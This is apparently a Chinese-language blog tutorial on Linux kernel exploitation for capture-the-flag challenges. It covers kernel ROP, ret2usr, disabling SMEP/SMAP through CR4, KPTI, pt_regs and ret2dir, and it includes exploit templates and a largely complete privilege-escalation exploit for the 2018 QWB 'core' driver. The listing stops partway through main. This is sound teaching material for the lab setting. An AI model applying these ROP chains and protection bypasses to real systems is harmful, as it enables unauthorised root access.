---
layout: post
title: 0x01. Linux kernel基础：Kernel ROP
category: system/kernel
date: 2024-7-20 13:00:00
---
Linux kernel基础：Kernel ROP

[toc]

# 初探Kernel ：Linux kernel pwn之Kernel ROP

## 0x01 文件初探

题目给出了四个文件：
```bash
$ ls
bzImage  core.cpio  start.sh  vmlinux
```

其中各个文件的解释如下：
```tex
bzImage：压缩内核镜像，压缩后的内核文件，适用于大内核
core.cpio：文件系统，包含内核启动后的文件
start.sh：qemu启动脚本，包含qemu启动时的配置项
vmlinux：原始内核文件
```

查看`start.sh`如下：

```bash
qemu-system-x86_64 \
-m 64M \    # 内存大小，我这里不够需要改为256M
-kernel ./bzImage \    # 指定内核文件
-initrd  ./core.cpio \  # 指定文件系统
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \ # 启动后的配置项，包括开启了kaslr。调试时可以通过修改为nokaslr来关闭kaslr
-s  \   # 支持gdb连接
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \  
-nographic  \
```

因此，正常情况下拿到这几个文件，直接给予`start.sh`文件可执行权限，运行该文件即可通过`qemu`来启动该内核环境获得一个`shell`：

```bash
chmod +x ./start.sh
./start.sh
```

## 0x02 配置项更改

启动`shell`后，可以看到`init`文件，这是一个启动时自动挂载的`shell`脚本：

```bash
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms # 将kallsyms即函数地址复制到了可读的目录下
echo 1 > /proc/sys/kernel/kptr_restrict # 开启后无法通过/proc/kallsyms来查看函数地址
echo 1 > /proc/sys/kernel/dmesg_restrict # 无法查看dmesg的内容
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko # 注册了core.ko驱动

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh # 以用户组1000即非root启动了shell
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

可以看到，挂载了`core.ko`文件，大概率这就是一个存在漏洞的文件。备份该文件：

```bash
cp ./core.ko ../core.ko # 待会再执行
```

脚本中包含定时关机的命令：`poweroff -d 120 -f`。这意味着，若我们按照该方式启动，该内核环境将会迅速关机，难以进行调试。因此，我们需要在通过`qemu`启动该环境前，解包`core.cpio`文件系统，并修改其中的`init`启动脚本再启动该环境。

通过如下命令完成：

```bash
mkdir core # 针对文件系统的操作在该文件夹下完成
mv core.cpio ./core/core.cpio.gz # gunzip只能解压gz后缀的文件
cd core
gunzip core.cpio.gz # gzip解压
cpio -idmv < core.cpio # cpio命令从命令行接收core.cpio作为参数来解压
cp core.ko ../core.ko
rm core.cpio # 不再需要
vim init # 修改init启动脚本
```

修改其中的定时关机：
```bash
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko

# poweroff -d 120 -f & 
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0 -f
```

利用环境中提供的打包脚本重新打包该文件：

```bash
./gen_cpio.sh core.cpio
```

`gen_cpio.sh`是环境中提供的重新打包文件系统的脚本，内容如下：

```bash
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > $1
```

我们也可以使用自己的命令打包，如下：

```bash
find . | cpio -o -H newc > ../core.cpio
# 或者：
find . | cpio -o --format=newc > ../rootfs.img
```

打包后，将其还原：

```bash
mv core.cpio ../core.cpio
cd ..
```

重新启动内核，不再有定时关机。

## 0x03 状态保存与恢复

### basic

归根到底，我们需要执行一个`commit_creds(prepare_kernel_cred(NULL))`，来让当前线程的`cred`结构体变为`init`进程的`cred`的拷贝从而获得`root`权限，并着陆到用户态起一个`shell`。（高版本改变权限的方式更为复杂，需要执行`commit_creds(prepare_kernel_cred(&init_task))`或`commit_creds(&init_cred)`）

在我们的`exploit`进入内核态之前，我们需要保存用户态的各个寄存器的值，从而手动模拟用户态进入到内核态的过程。例如，我们可以通过如下方式来保存寄存器的值（使用这种内联汇编在`gcc`编译时需要指定`-masm=intel`）：

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
```

而在我么能成功执行`commit_creds(prepare_kernel_cred(NULL))`后，我们又需要返回用户态并着陆起一个`shell`。返回用户态的方式分为两步即：

- 通过`swapgs`恢复用户态`GS`寄存器
- 通过`sysretq`或者`iretq`指令恢复到用户空间

因此通过`swapgs; iretq`的方式就可以返回到用户态。

例如，使用`ROP`时，我们可以让栈保存为如下状态来返回用户态：

```c
swapgs
iretq
user_shell_addr // the func that will be execute
user_cs
user_eflags // 64bit:user_rflags
user_sp
user_ss
```

### with kpti

`kpti`机制可以参考后文的介绍部分。

若程序开启了`kpti`机制，那么我们甚至不能简单通过`swapgs; iretq`这样的方式来返回到用户态。在此之前，我们还需要将页表切换为用户页表，而这个操作只需要将`cr3`寄存器的第`13`位取反（用户态为高位）即可。实际上，有一个函数专门用于完成这个操作，即`swapgs_restore_regs_and_return_to_usermode`。该函数操作总结如下：

```assembly
# 一些pop操作
mov  rdi, cr3
or rdi, 0x1000
mov  cr3, rdi
pop rax
pop rdi
swapgs
iretq
```

由上可知，我们可以直接通过该函数一气呵成地完成切换用户态页表和`swapgs; iretq`两个操作。因此，我们只需要将栈布局为如下形式即可：

```c
↓   swapgs_restore_regs_and_return_to_usermode + 27
    0 // padding
    0 // padding
    user_shell_addr
    user_cs
    user_rflags
    user_sp
    user_ss
```

一个板子如下：

（注意，`gcc`需要通过`gcc exp.c -o exp -masm=intel -static`来编译该文件）

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if(getuid()) {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");
}

int main(){

}
```

`vscode`中用户`json`代码片段如下：

```json
"kernel":{
    "prefix":"kernel",
    "body":[
        "#define _GNU_SOURCE",
        "#include <stdio.h>",
        "#include <stdlib.h>",
        "#include <string.h>",
        "#include <unistd.h>",
        "#include <fcntl.h>",
        "#include <sys/types.h>",
        "#include <sys/ioctl.h>",
        "#include <stdarg.h>",
        "#include <sys/mman.h>",
        "",
        "void info(const char *format, ...)",
        "{",
        "    va_list args;",
        "    va_start(args, format);",
        "    printf(\"%s\", \"\\033[34m\\033[1m[*] \");",
        "    vprintf(format, args);",
        "    printf(\"%s\", \"\\033[0m\\n\");",
        "}",
        "",
        "void success(const char *format, ...)",
        "{",
        "    va_list args;",
        "    va_start(args, format);",
        "    printf(\"%s\", \"\\033[32m\\033[1m[+] \");",
        "    vprintf(format, args);",
        "    printf(\"%s\", \"\\033[0m\\n\");",
        "}",
        "",
        "void error(const char *format, ...)",
        "{",
        "    va_list args;",
        "    va_start(args, format);",
        "    printf(\"%s\", \"\\033[31m\\033[1m[x] \");",
        "    vprintf(format, args);",
        "    printf(\"%s\", \"\\033[0m\\n\");",
        "}",
        "",
        "size_t commit_creds = 0, prepare_kernel_cred = 0;",
        "",
        "size_t user_cs, user_ss, user_rflags, user_sp;",
        "void save_status()",
        "{",
        "    asm volatile (",
        "        \"mov user_cs, cs;\"",
        "        \"mov user_ss, ss;\"",
        "        \"mov user_sp, rsp;\"",
        "        \"pushf;\"",
        "        \"pop user_rflags;\"",
        "    );",
        "    info(\"Status has been saved.\");",
        "}",
        "",
        "void get_root_shell(void)",
        "{",
        "    if(getuid()) {",
        "        error(\"Failed to get the root!\");",
        "        exit(-1);",
        "    }",
        "",
        "    success(\"Successful to get the root. Execve root shell now...\");",
        "    system(\"/bin/sh\");",
        "}",
        "",
        "int main(){",
        "",
        "",
        "",
        "}"
    ],
    "description": "kernel snippets"
}
```

## 0x04 KPTI机制

`KPTI`机制将内核页表和用户空间页表分开来实现隔离。这里摘录自`arttnba3`师傅的博客：

众所周知 `Linux` 采用**四级页表**结构（`PGD->PUD->PMD->PTE`），而 `CR3` 控制寄存器用以存储当前的 `PGD` 的地址，因此在开启 `KPTI` 的情况下用户态与内核态之间的切换便涉及到 `CR3` 的切换，为了提高切换的速度，内核将内核空间的 `PGD` 与用户空间的 `PGD` 两张页全局目录表放在一段连续的内存中（两张表，一张一页`4k`，总计`8k`，内核空间的在低地址，用户空间的在高地址），这样**只需要将 `CR3` 的第 `13` 位取反便能完成页表切换的操作**

![image.png](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/Rm8Ti9MpVUZ7fPK.png)

需要进行说明的是，**在这两张页表上都有着对用户内存空间的完整映射，但在用户页表中只映射了少量的内核代码（例如系统调用入口点、中断处理等），而只有在内核页表中才有着对内核内存空间的完整映射**，如下图所示，左侧是未开启 `KPTI` 后的页表布局，右侧是开启了 `KPTI` 后的页表布局

**`KPTI` 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（`NX`），这使得 `ret2usr` 彻底成为过去式**。

![image.png](https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png)

在 `64` 位下用户空间与内核空间都占 `128TB`，所以他们占用的页全局表项（`PGD`）的大小应当是相同的，图上没有体现出来，**必定在某个节点上同时存在着完整的对用户空间与内核空间的映射**，这个节点就是当 `CPU` 运行在内核态时

**以上均摘录自`arttnba3`师傅的博客**，总结得非常详细。笔者本人初学时一度有疑问，既然存在`KPTI`机制的绕过，为什么还说`ret2usr`成为过去式？事实上这是因为`KPTI`机制的“绕过”只是使得我们可以切换`CR3`寄存器来切换页表到用户页表，然而在内核态时用户地址空间页表对应的地址仍然不具有可执行权限，这才是`ret2usr`失效的主要原因。

## 0x05 kernel ROP - Basic

如果不是对`kernel`存在敬畏，对于`kernel ROP`应该没有什么学习成本，因为和用户态下的`ROP`无本质区别。用户态下我们需要通过`system("/bin/sh")`来获得一个`shell`，而内核态下我们需要通过`commit_creds(prepare_kernel_cred(NULL))`来提权为`root`（是的，高版本还需要`commit_creds(prepare_kernel_cred(&init_task))`或`commit_creds(&init_cred)`））。

例如，这是笔者在做`2018qwb_core`中的`ROP chain`：

```c
rop_chain[i++] = POP_RDI_RET + offset;
rop_chain[i++] = 0;
rop_chain[i++] = prepare_kernel_cred;
rop_chain[i++] = POP_RCX_RET + offset;
rop_chain[i++] = commit_creds;
rop_chain[i++] = MOV_RDI_RAX_POP_RBP_JMP_RCX + offset;
rop_chain[i++] = 0; // pop_rbp
rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
rop_chain[i++] = 0; // pop_fq
rop_chain[i++] = IRETQ_RET + offset;
rop_chain[i++] = (size_t)get_root_shell;
rop_chain[i++] = user_cs;
rop_chain[i++] = user_rflags;
rop_chain[i++] = user_sp;
rop_chain[i++] = user_ss;
```

可谓是相当熟悉了。

## 0x06 kernel ROP - ret2usr

~~ret2usr没了，不用学了~~

`ret2usr`实际上仍然属于`ROP`（确信），但由于`kernel`题中我们可以自行编写用户态下运行的`C`语言程序，因此我们便可以通过用户态下的`C`语言程序来直接执行内核态下的函数`commit_creds(prepare_kernel_cred(NULL))`，这可以减少`ROP`链构造的成本（例如你至少不需要通过`pop rdi`这些`gadgets`来传参执行函数）

例如，我们用户态下编写函数：

```c
void userland_root_shell(void){
    void* (*prepare_kernel_cred_ptr)(void*) = (void*)prepare_kernel_cred;
    int (*commit_creds_ptr)(void*) = (void*)commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```

随后`ROP chain`便可以简化为如下形式：

```c
// commit_creds(prepare_kernel_cred(NULL));
rop_chain[i++] = (size_t)userland_root_shell;
rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
rop_chain[i++] = 0; // pop_fq
rop_chain[i++] = IRETQ_RET + offset;
rop_chain[i++] = (size_t)get_root_shell;
rop_chain[i++] = user_cs;
rop_chain[i++] = user_rflags;
rop_chain[i++] = user_sp;
rop_chain[i++] = user_ss;
```

### smep && smap bypass

若内核开启了`smep/smap`机制，那么内核态无法访问用户态的代码并执行，否则会引起`panic`。然而，控制`smep/smap`是否开启的变量实际上是存储在`cr4`寄存器中的，这意味着我们可以通过`ROP`将其关闭。

在未开启`smep/smap`机制时，`cr4`的值一般为`0x6f0`（是的，一般），因此我们将其修改为这个值就可以绕过`smep/smap`机制。

如下所示，我们修改`start.sh`文件，使其开启`smep/smap`：

```bash
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-cpu qemu64-v1,+smep,+smap \ # 在这里，开启smep和smap，注意无空格否则报错
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic
```

此时我们修改`rop_chain`为如下状态即可：

```c
rop_chain[i++] = POP_RAX_RET + offset;
rop_chain[i++] = 0x6f0;
rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;
rop_chain[i++] = (size_t)userland_root_shell;
rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
rop_chain[i++] = 0; // pop_fq
rop_chain[i++] = IRETQ_RET + offset;
rop_chain[i++] = (size_t)get_root_shell;
rop_chain[i++] = user_cs;
rop_chain[i++] = user_rflags;
rop_chain[i++] = user_sp;
rop_chain[i++] = user_ss;
```

虽然但是，我们上面指定了`cpu`型号为`qemu64-v1`，因为其他`CPU`默认开启`kpti`机制（例如一般指定的`kvm64`），导致在内核页表下的用户地址无可执行权限，会直接导致`panic`。`byebye ret2usr`。

## 0x07 pt_regs结构体

在用户态下，我们经常使用系统调用产生中断，以切换到内核态来执行函数，例如`x86-64`中的`syscall`。

然而，我们知道`64`位下前`6`个参数都位于寄存器中，而系统调用的值实际上也需要进行寻址，那么如何对寄存器寻址呢？实际上，这是因为当程序进入到内核态的时候，操作系统会将所有的寄存器压入到内核栈上，形成一个`pt_regs`结构体。而该结构体实际上位于内核栈底，[定义](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44)如下：

```c
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
    unsigned long r15;
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
    unsigned long orig_rax;
/* Return frame for iretq */
    unsigned long rip;
    unsigned long cs;
    unsigned long eflags;
    unsigned long rsp;
    unsigned long ss;
/* top of stack page */
};
```

有点用户态下的`srop`的味道了。

到这里，我们需要了解内核中的`pt_regs`结构体，了解我们用户态发起系统调用时内核态下参数的存放位置。不难想到，我们可以借助`pt_regs`中的值来进行某些操作，例如栈迁移等。

因此，在进行系统调用时，我们可以利用如下板子，如此可以找到内核栈上的`pt_regs`结构体：

```c
__asm__(
    "mov r15,   0xbeefdead;"
    "mov r14,   0x11111111;"
    "mov r13,   0x22222222;"
    "mov r12,   0x33333333;"
    "mov rbp,   0x44444444;"
    "mov rbx,   0x55555555;"
    "mov r11,   0x66666666;"
    "mov r10,   0x77777777;"
    "mov r9,    0x88888888;"
    "mov r8,    0x99999999;"
    "xor rax,   rax;"
    "mov rcx,   0xaaaaaaaa;"
    "mov rdx,   8;"
    "mov rsi,   rsp;"
    "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
    "syscall"
);
```

通过这个`pt_regs`结构体，只需要找到形如`add rsp, val; ret`的`gadget`即可完成`ROP`，非常实用。

## 0x08 ret2dir

在`kernel`中，存在一个区域叫做`direct mapping memory`，如下所示：

![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/2QMrXEh9qLymCoK.png)

看到这个图比较懵，没关系，只需要知道一点：

在虚拟内存内核态空间中存在一个区域叫做`direct mapping memory`，它线性地映射了整个物理内存。而用户空间的数据一定存放在物理内存上，这就意味着，任何一段用户区域的内存，都可以在内核态空间中的`direct mapping memory`上找到。这就是`ret2dir`，可以绕过`smep/smap/kpti`安全机制，因为这并没有直接访问用户空间地址。

大致利用方式如下：

- 通过`mmap`在用户地址空间喷射大量内存
- 泄露内核的堆地址（也就是`kmalloc`分配的地址，这个地址属于`direct mapping memory`）
- 利用泄露出的地址进行搜索，从而找到在用户空间喷射的内存

## 0xFF 杂谈

### 成功执行提权函数但没有root权限

很奇怪的问题，笔者是在做`2017 ciscn babydriver`的时候遇到了该问题，出现问题时会导致成功执行提权函数但没有`root`权限。

最终解决方案是在`gcc`编译时添加优化选项`-Os`即可解决，原因笔者尚且未知，此外笔者测试该题目环境中`-O2`也可以，但别的都不行。

### gadgets寻找

有多种方法，但是都非常慢，例如`ropper`、`ROPgadget`等。笔者是倾向于使用`ropper`。

若程序没有给`vmlinux`，可以用如下`extract-vmlinux`脚本跑出来，如下：

（很难绷的一件事是，我使用`2018_qwb_core`的`vmlinux`跑出来的`gadgets`是错的，但如下方式可以提取出正确的`vmlinux`，很难评价。）

```bash
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

用法：

```bash
./extract-vmlinux ./bzImage > vmlinux
```

### 用户组管理

在`etc`目录下含有`/etc/passwd`和`/etc/group`两个文件，都是用于`Linux`的用户组管理的。

其中`/etc/group`包含系统上用户组的信息，而`/etc/passwd`包含具体某个用户的信息。

具体来说，`/etc/group`中，每一行表示一个组，每个组的条目由四个字段组成，以冒号分隔，包括组名、组密码、组`ID`、组成员。

以以下信息为例：

```bash
root:x:0:
chal:x:1000:
```

其中包含两个组，分别为组名为`root`的组和组名为`chal`的组。其中：

- 两个组的第二个字段均为空，表示密码信息实际上已经不再使用（现在通常由`/etc/shadow`管理）。

- 第三个字段`0`和`1000`表示组的`ID`，其中`root`组的`ID`为`0`而`chal`组的`ID`为`1000`。

- 第四个字段为空，表示没有写明组成员具体有哪些。

而对于`/etc/passwd`文件，每一行表示一个用户账户，由七个字段组成，同样由冒号分隔，包括用户名、密码、用户`ID`、组`ID`、用户信息、家目录、登录`shell`。

以以下信息为例：

```tex
root:x:0:0:root:/root:/bin/sh
chal:x:1000:1000:chal:/home/chal:/bin/sh
```

其中包含两个用户，`root`用户和`chal`组。其中：

- 第二个字段为密码，不再使用而交由`/etc/shadow`管理。
- 第三个字段表示用户的`ID`，其中`root`用户的`ID`为`0`而`chal`用户的`ID`为`1000`。
- 第四个字段表示组`ID`，表示用户所属组的`ID`。
- 第五个字段表示用户信息，通常含有用户全名或其他描述性信息。
- 第六个字段表示用户的家目录，表示用户的主目录，用户登录后会进入这个目录。
- 第七个字段表示登录`shell`，是用户登录后默认启动的`shell`。

了解到上述信息后，我们可以修改`rcS`文件来修改`qemu`虚拟机启动后的用户。

其中，`rcS`文件是一个启动脚本，用于在系统引导过程中启动一些基本的系统服务和设置环境。在部分文件系统中，根目录下有一个名为`init`文件即为`rcS`文件。有时候也会位于`/etc`中。

`init`文件中有一行命令如下：

```bash
setsid /bin/cttyhack setuidgid 1000 /bin/sh
```

其中`setsid`命令可以启动一个新的会话，并连续执行了`/bin/cttyhack`、`setuidgid 1000 /bin/sh`。其中，以`setuidgid`命令来以用户组`1000`启动了一个`shell`，而`1000`表示用户组`chal`。因此，我们将其修改为`0`，即可让其启动一个拥有`root`权限的`shell`来进行调试。

### gdb调试

回顾`2018`强网杯`core`的`start.sh`：

```bash
qemu-system-x86_64 \
-m 64M \    # 内存大小，我这里不够需要改为128M
-kernel ./bzImage \    # 指定内核文件
-initrd  ./core.cpio \  # 指定文件系统
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \ # 启动后的配置项，包括开启了kaslr
-s  \   # 支持gdb连接
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \  
-nographic  \
```

其中，我们提到`-s`表示支持`gdb`连接。实际上，查阅文档如下：

```tex
-s              shorthand for -gdb tcp::1234
```

说明`-s`实际上是`-gdb tcp::1234`的缩写，表示该`qemu`启动的虚拟机支持使用`gdb`调试，端口为`1234`。

因此，我们启动虚拟机后，可以在宿主机启动`gdb`，然后使用命令`target remote :1234`来挂载到虚拟机。

这之后，虚拟机将无法输入任何数据（正在处于被调试状态）。

我们在`gdb`中添加符号表，来使得可以在正确的函数上下断点。

在这之前，需要先获得加载的驱动的基地址，可以通过如下三种方式查看，效果一样：

- `cat /proc/modules | grep [驱动名]`

- `lsmod`

- `cat /sys/module/[驱动名]/sections/.text`

值得注意的是，上述三种方法**都需要`root`权限**才可以查看，可以参照上面的用户组部分来在以`root`权限调试。如下所示：

```bash
/ $ cat /proc/modules | grep core
core 16384 0 - Live 0xffffffffc01f1000 (O)
/ $ lsmod
core 16384 0 - Live 0xffffffffc01f1000 (O)
/ $ cat /sys/module/core/sections/.text
0xffffffffc01f1000
```

接下来，在`gdb`中，输入命令`add-symbol-file [驱动名] [基地址]`来加载函数符号。例如：

```bash
add-symbol-file core.ko 0xffffffffc01f1000
```

即可加载函数符号。之后使用`b func`即可下断点，例如`b core_copy_func`，即可下断点，之后输入`c`，此时虚拟机即可正常输入，运行`exp`后到`core_copy_func`即会暂停下来。

### 编写gdb调试脚本

上面我们已经提到了如何使用`gdb`来调试`kernel`。然而，每一次输入`lsmod`、`add-symbol-file`、`target remote:1234`等略显繁杂，我们可以利用`-ex`编写`gdb`调试脚本如下：

```bash
gdb -q \
       -ex "add-symbol-file ./kgadget.ko 0xffffffffc0002000" \
       -ex "target remote:1234" \
       -ex "b *0xffffffffc0002116"
```

### 内核函数api记录

内核中的`printf`函数。和用户态中区别不大。

```c
int printk(const char *fmt, ...);
```

内核中的`memcpy`函数。

```c
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);
```

以及

```c
unsigned long copy_to_user(void __user *to, const void *from, unsigned long n);c
```

### 内核结构体查看工具：pahole

在不同内核版本下，结构体的大小可能不尽相同。而`pahole`是一个可以直接查看结构体的定义和大小的工具，非常方便。

安装方式如下：

```bash
sudo apt install libdw-dev
sudo apt install cmake

git clone https://git.kernel.org/pub/scm/devel/pahole/pahole.git/
cd pahole
mkdir build
cd build
cmake -D__LIB=lib ..
sudo make install
```

安装完成之后，使用非常简单，直接输入即可查看当前内核下所有结构体：

```bash
pahole
```

也可以通过如下方式来仅仅查看某个结构体：

```bash
pahole -C <struct_name>
// e.g. pagole -C pt_regs
```

### 第一个exp: 2018_qwb_core

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <stdarg.h>

void info(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[34m\033[1m[*] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void success(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[32m\033[1m[+] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

void error(const char *format, ...)
{
    va_list args;
    va_start(args, format);
    printf("%s", "\033[31m\033[1m[x] ");
    vprintf(format, args);
    printf("%s", "\033[0m\n");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
    info("Status has been saved.");
}

void get_root_shell(void)
{
    if (getuid())
    {
        error("Failed to get the root!");
        exit(-1);
    }

    success("Successful to get the root. Execve root shell now...");
    system("/bin/sh");
}

void core_read(int fd, char *buf)
{
    ioctl(fd, 0x6677889B, buf);
}

void set_off(int fd, int value)
{
    ioctl(fd, 0x6677889C, value);
}

void core_copy_func(int fd, size_t size)
{
    ioctl(fd, 0x6677889A, size);
}

#define POP_RDI_RET 0xffffffff81000b2f
#define POP_RAX_RET 0xffffffff810520cf
#define POP_RCX_RET 0xffffffff81021e53
#define MOV_RDI_RAX_POP_RBP_JMP_RCX 0xffffffff81532471
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ_RET 0xffffffff81050ac2


int main()
{
    FILE *fd_kallsyms = NULL;
    size_t addr = 0, offset = 0;
    char type[0x10], func[0x50];
    char buf[0x100];
    size_t canary = 0;
    int fd = -1;
    int i = 0;
    size_t rop_chain[0x100];

    info("Start to exploit...");
    save_status();

    // 第一步：通过查/kallsyms获得所有函数地址
    fd_kallsyms = fopen("/tmp/kallsyms", "r");
    if (fd_kallsyms == NULL)
    {
        error("Open kallsyms error.");
    }

    while (fscanf(fd_kallsyms, "%lx%s%s", &addr, type, func))
    {

        if (prepare_kernel_cred && commit_creds)
        {
            break;
        }
        if (!strcmp(func, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            success("prepare_kernel_cred addr found.");
        }
        if (!strcmp(func, "commit_creds"))
        {
            commit_creds = addr;
            success("commit_creds addr found.");
        }
    }

    // 无kaslr时： 0xffffffff8109cce0
    printf("The addr of prepare_kernel_cred is 0x%lx.\n", prepare_kernel_cred);
    // 无kaslr时： 0xffffffff8109c8e0
    printf("The addr of commit_creds is 0x%lx.\n", commit_creds);

    offset = prepare_kernel_cred - 0xffffffff8109cce0;
    printf("The offset of kaslr is 0x%lx.\n", offset);

    fd = open("/proc/core", 2);
    if (fd < 0)
    {
        error("Failed to open /proc/core.");
        exit(0);
    }

    set_off(fd, 64);
    core_read(fd, buf);
    canary = ((size_t *)buf)[0];
    info("The value of canary is 0x%lx.", canary);
    printf("canary: 0x%lx.\n", canary);

    for (i = 0; i < 10; i++)
    {
        rop_chain[i] = canary;
    }

    // commit_creds(prepare_kernel_cred(NULL));
    rop_chain[i++] = POP_RDI_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = prepare_kernel_cred;
    rop_chain[i++] = POP_RCX_RET + offset;
    rop_chain[i++] = commit_creds;
    rop_chain[i++] = MOV_RDI_RAX_POP_RBP_JMP_RCX + offset;
    rop_chain[i++] = 0; // popo_rbp
    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
    rop_chain[i++] = 0; // pop_fq
    rop_chain[i++] = IRETQ_RET + offset;
    rop_chain[i++] = (size_t)get_root_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;
    
    
    write(fd, rop_chain, 0x800);
